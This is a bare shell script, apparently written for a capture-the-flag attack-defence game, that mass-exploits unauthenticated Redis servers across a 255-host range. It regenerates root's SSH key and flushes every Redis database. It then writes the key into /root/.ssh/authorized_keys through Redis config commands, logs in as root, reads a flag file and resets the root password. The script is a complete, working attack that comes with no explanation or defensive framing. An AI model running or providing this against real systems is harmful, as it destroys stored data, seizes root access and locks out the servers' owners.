rm -r /root/.ssh/id_rsa
rm -r /root/.ssh/id_rsa.pub
ssh-keygen -t rsa << EOF






EOF

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt 
for i in $(seq 255)
do
s="127.16.$i.250"
timeout 0.1s redis-cli -h $s << EOF
FLUSHDB
FLUSHALL
EOF

cat key.txt | redis-cli -h $s -x set xxx & { sleep 0.1;kill $! &} 
timeout 1s redis-cli -h $s << EOF
config set dir /root/.ssh/
config set dbfilename authorized_keys
get xxx
save
EOF

timeout 2s ssh -o"StrictHostKeyChecking no" root@$s << EOF
cat /root/flag.txt
echo ------------------------IP:$s------------------------------
echo sjqyyds | passwd  --stdin root
exit
EOF
done

